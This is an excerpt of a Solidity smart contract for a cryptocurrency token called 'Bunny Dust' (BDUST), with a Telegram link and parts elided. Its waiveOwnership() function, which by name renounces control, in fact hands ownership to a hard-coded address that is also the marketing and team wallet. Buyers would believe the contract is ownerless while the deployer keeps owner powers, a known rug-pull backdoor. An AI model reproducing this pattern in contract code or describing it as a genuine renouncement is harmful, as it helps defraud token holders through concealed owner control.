...
/**
Telegram : https://t.me/BunnyDustBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xCc38e822509731278c6BDD6e44C3D67b7Bc63517);
    }
...
contract BunnyDust is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bunny Dust";
    string private _symbol = "BDUST";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xCc38e822509731278c6BDD6e44C3D67b7Bc63517);
    address payable private teamWalletAddress = payable(0xCc38e822509731278c6BDD6e44C3D67b7Bc63517);
